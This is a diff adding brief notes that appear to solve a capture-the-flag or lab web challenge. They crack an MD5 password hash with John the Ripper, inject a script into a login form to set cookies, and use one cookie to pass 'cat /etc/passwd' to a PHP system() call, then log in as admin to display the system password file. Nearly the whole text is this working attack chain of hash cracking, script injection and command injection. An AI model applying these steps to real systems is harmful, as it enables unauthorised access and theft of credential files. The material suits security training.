@@ -1,0 +1,18 @@
+// the pass hashed with md5 is '5ebe2294ecd0e0f08eab7690d2a6ee69' , got it from verify.php
+// to decrypt the pass
+echo 5ebe2294ecd0e0f08eab7690d2a6ee69 > passwd
+sudo john --wordlist:xato-net-10-million-passwords.txt passwd
+// wich returns
+-> secret()
+// to print the /etc/passwd file you need to 
+// 1. set the cookie language=nl so that the nl.php is loaded
+// 2. set the cookie _s_=cat /etc/passwd so that system($s) prints /etc/passwd
+// you do this by injecting this script in the username form and pressing enter
+<script>
+	document.cookie= 'language=nl';
+	document.cookie= '_s_=cat /etc/passwd';
+</script>
+// now that the cookies are set you can go back to the login page and enter with 
+username=admin
+password=secret
+// the localhost passwords will be displayed on the page
